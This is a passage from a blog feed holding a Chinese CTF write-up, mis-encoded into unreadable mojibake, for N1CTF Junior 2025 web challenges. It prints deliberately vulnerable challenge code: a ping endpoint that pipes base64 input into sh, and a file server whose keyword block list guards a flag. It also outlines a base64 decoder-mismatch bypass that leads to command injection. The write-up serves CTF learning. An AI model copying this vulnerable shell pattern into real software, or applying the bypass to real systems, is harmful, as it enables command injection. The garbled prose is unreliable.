    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å…³äºè¿™ä¸ªçš„æ€»ç»“å¥½åƒä¸æ˜¯ç‰¹åˆ«å¤šï¼Œååå›½å¤–èµ›ä»¥åŠä¸€äº›è”åˆæˆ˜é˜Ÿçš„æ¯”èµ›ä¹Ÿçˆ±å‡ºè¿™ä¸ªï¼ˆ&lt;/p&gt;
&lt;p&gt;é‚æ•´ç†ä¸€ç‚¹ä¸œè¥¿å‡ºæ¥&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="XSS" scheme="http://c1oudfl0w0.github.io/blog/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF Junior 2025 2/2</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/09/13/N1CTF-Junior-2025-2-2/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/09/13/N1CTF-Junior-2025-2-2/</id>
    <published>2025-09-13T02:10:32.000Z</published>
    <updated>2025-11-28T02:53:39.619Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p>ZianTT çš„ wpï¼š <a href="https://mp.weixin.qq.com/s/NtgULOY4uKJ5MT3L5WLcqA">https://mp.weixin.qq.com/s/NtgULOY4uKJ5MT3L5WLcqA</a></p><p>A5rZ çš„ wpï¼š <a href="https://blog.csdn.net/weixin_59166557/article/details/151723712">https://blog.csdn.net/weixin_59166557/article/details/151723712</a></p><p>Sh_eePppp çš„ wpï¼š <a href="https://sheep-sys-sudo.github.io/n1CTF-web-WP/#safenotes">https://sheep-sys-sudo.github.io/n1CTF-web-WP/#safenotes</a></p><span id="more"></span><hr><h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> subprocess<span class="token keyword">import</span> re<span class="token keyword">import</span> ipaddress<span class="token keyword">import</span> flask<span class="token keyword">def</span> <span class="token function">run_ping</span><span class="token punctuation">(</span>ip_base64<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        decoded_ip <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>ip_base64<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r'^\d+\.\d+\.\d+\.\d+$'</span><span class="token punctuation">,</span> decoded_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> decoded_ip<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">all</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>part<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">256</span> <span class="token keyword">for</span> part <span class="token keyword">in</span> decoded_ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> ipaddress<span class="token punctuation">.</span>ip_address<span class="token punctuation">(</span>decoded_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>decoded_ip<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">15</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r'^[A-Za-z0-9+/=]+$'</span><span class="token punctuation">,</span> ip_base64<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    command <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""echo "ping -c 1 $(echo '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ip_base64<span class="token punctuation">&#125;</span></span><span class="token string">' | base64 -d)" | sh"""</span></span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        process <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>            command<span class="token punctuation">,</span>            shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>            check<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>            capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>            text<span class="token operator">=</span><span class="token boolean">True</span>        <span class="token punctuation">)</span>        <span class="token keyword">return</span> process<span class="token punctuation">.</span>stdout    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/ping'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>json    ip_base64 <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'ip_base64'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> ip_base64<span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'no ip'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>    result <span class="token operator">=</span> run_ping<span class="token punctuation">(</span>ip_base64<span class="token punctuation">)</span>    <span class="token keyword">if</span> result<span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'success'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">:</span> result<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'success'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹ä¸€ä¸‹é™åˆ¶ï¼š</p><ul><li>è§£ç åçš„ ip å¿…é¡»æ˜¯ <code>x.x.x.x</code> å½¢å¼</li><li><code>.</code> å¿…é¡»ä¸ºä¸‰ä¸ª</li><li>ä»¥ <code>.</code> åˆ†éš”çš„æ¯éƒ¨åˆ†å¿…é¡»èƒ½ int è½¬åŒ–ä¸º 0 åˆ° 256 çš„æ•°</li><li>æ»¡è¶³ ipv4 æˆ–è€… ipv6</li><li>ip é•¿åº¦ä¸èƒ½è¶…è¿‡ 15</li></ul><p>å‘½ä»¤æ‰§è¡Œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"ping -c 1 <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">''</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span class="token variable">)</span></span>"</span> <span class="token operator">|</span> <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>çŒœæµ‹å’Œ <code>b64decode</code> ä¸ <code>base64 -d</code> çš„å·®å¼‚æœ‰å…³</p><p>æ‰¾åˆ°ä¸€ä¸ª b64decode çš„ bugï¼š<a href="https://bugs.python.org/issue34832">https://bugs.python.org/issue34832</a></p><p>è€ŒåŒæ ·çš„å†…å®¹åœ¨ <code>base64 -d</code> ä¸Šå¯ä»¥æ­£å¸¸è§£ç ï¼Œé‚£ä¹ˆæ„é€ å‘½ä»¤æ‰§è¡Œå³å¯</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250914004748284.png"></p><hr><h1 id="Peek-a-Fork"><a href="#Peek-a-Fork" class="headerlink" title="Peek a Fork"></a>Peek a Fork</h1><p>&#x2F;entrypoint.sh</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/sh</span><span class="token builtin">set</span> <span class="token operator">-</span>eecho <span class="token string">"$FLAG"</span> <span class="token operator">></span> <span class="token operator">/</span>app<span class="token operator">/</span>flag<span class="token punctuation">.</span>txtunset FLAG<span class="token keyword">exec</span> python <span class="token operator">/</span>app<span class="token operator">/</span>server<span class="token punctuation">.</span>py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag å°±åœ¨å½“å‰ç›®å½•ä¸‹ flag.txtï¼Œä½†æ˜¯è¦ç»•è¿‡ 403 waf</p><p>fuzz ä¸€ä¸‹å‘ç° ban äº† <code>&#39;</code>ã€<code>&gt;</code> ã€<code>&lt;</code>ã€<code>&quot;</code>ã€<code>^</code>ã€<code>./</code> ã€<code>..</code>ã€<code>flag</code></p><p>åé¢å‘ç°ç»™äº†æºç </p><p>server.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> os<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> fcntl<span class="token keyword">import</span> re<span class="token keyword">import</span> mmap<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    flag <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>mm <span class="token operator">=</span> mmap<span class="token punctuation">.</span>mmap<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>mm<span class="token punctuation">.</span>write<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span>FORBIDDEN <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'flag'</span><span class="token punctuation">,</span> <span class="token string">b'proc'</span><span class="token punctuation">,</span> <span class="token string">b'&lt;'</span><span class="token punctuation">,</span> <span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'^'</span><span class="token punctuation">,</span> <span class="token string">b"'"</span><span class="token punctuation">,</span> <span class="token string">b'"'</span><span class="token punctuation">,</span> <span class="token string">b'..'</span><span class="token punctuation">,</span> <span class="token string">b'./'</span><span class="token punctuation">]</span>PAGE <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE html>&lt;html lang="en">&lt;head>    &lt;meta charset="UTF-8">    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0">    &lt;title>Secure Gateway&lt;/title>    &lt;style>        body &#123; font-family: 'Courier New', monospace; background-color: #0c0c0c; color: #00ff00; text-align: center; margin-top: 10%; &#125;        .container &#123; border: 1px solid #00ff00; padding: 2rem; display: inline-block; &#125;        h1 &#123; font-size: 2.5rem; text-shadow: 0 0 5px #00ff00; &#125;        p &#123; font-size: 1.2rem; &#125;        .status &#123; color: #ffff00; &#125;    &lt;/style>&lt;/head>&lt;body>    &lt;div class="container">        &lt;h1>Firewall&lt;/h1>        &lt;p class="status">STATUS: All systems operational.&lt;/p>        &lt;p>Your connection has been inspected.&lt;/p>    &lt;/div>&lt;/body>&lt;/html>"""</span><span class="token keyword">def</span> <span class="token function">handle_connection</span><span class="token punctuation">(</span>conn<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> log<span class="token punctuation">,</span> factor<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        conn<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">10.0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> log<span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'log.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                fcntl<span class="token punctuation">.</span>flock<span class="token punctuation">(</span>f<span class="token punctuation">,</span> fcntl<span class="token punctuation">.</span>LOCK_EX<span class="token punctuation">)</span>                log_bytes <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>factor<span class="token punctuation">)</span><span class="token punctuation">:</span>                    log_bytes <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha3_256<span class="token punctuation">(</span>log_bytes<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>                log_entry <span class="token operator">=</span> log_bytes<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>log_entry<span class="token punctuation">)</span>                        request_data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> request_data<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b"GET /"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> <span class="token string">b"HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request"</span>            conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            path <span class="token operator">=</span> request_data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            pattern <span class="token operator">=</span> <span class="token string">rb'\?offset=(\d+)&amp;length=(\d+)'</span>                        offset <span class="token operator">=</span> <span class="token number">0</span>            length <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> path<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>                offset <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                length <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                clean_path <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>                filename <span class="token operator">=</span> clean_path<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                filename <span class="token operator">=</span> path<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            response <span class="token operator">=</span> <span class="token string">b"HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request"</span>            conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> filename<span class="token punctuation">:</span>            response_body <span class="token operator">=</span> PAGE            response_status <span class="token operator">=</span> <span class="token string">"200 OK"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>normpath<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    <span class="token keyword">if</span> offset <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                        f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>                                        data_bytes <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>length<span class="token punctuation">)</span>                    response_body <span class="token operator">=</span> data_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'ignore'</span><span class="token punctuation">)</span>                response_status <span class="token operator">=</span> <span class="token string">"200 OK"</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                response_body <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"Invalid path"</span></span>                response_status <span class="token operator">=</span> <span class="token string">"500 Internal Server Error"</span>        response <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"HTTP/1.1 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response_status<span class="token punctuation">&#125;</span></span><span class="token string">\r\nContent-Length: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>response_body<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\r\n\r\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>response_body<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Server listening on port 1337..."</span></span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pid<span class="token punctuation">,</span> status <span class="token operator">=</span> os<span class="token punctuation">.</span>waitpid<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>WNOHANG<span class="token punctuation">)</span>        <span class="token keyword">except</span> ChildProcessError<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        initial_data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> socket<span class="token punctuation">.</span>MSG_PEEK<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>term <span class="token keyword">in</span> initial_data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> term <span class="token keyword">in</span> FORBIDDEN<span class="token punctuation">)</span><span class="token punctuation">:</span>            conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b"HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected."</span><span class="token punctuation">)</span>            conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>                    <span class="token keyword">if</span> initial_data<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'GET /?log=1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                factor <span class="token operator">=</span> <span class="token number">1</span>                pattern <span class="token operator">=</span> <span class="token string">rb"&amp;factor=(\d+)"</span>                <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> initial_data<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>                    factor <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                pid <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                    server<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                    handle_connection<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> factor<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[ERROR]: "</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>            <span class="token keyword">finally</span><span class="token punctuation">:</span>                conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            pid <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                server<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                handle_connection<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>                conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥æŠŠ flag è¯»åˆ°å†…å­˜ä¹‹ååˆ äº†</p><h2 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h2><p>æ³¨æ„è¿™é‡Œï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pattern <span class="token operator">=</span> <span class="token string">rb'\?offset=(\d+)&amp;length=(\d+)'</span>clean_path <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span aria-hidden="true" 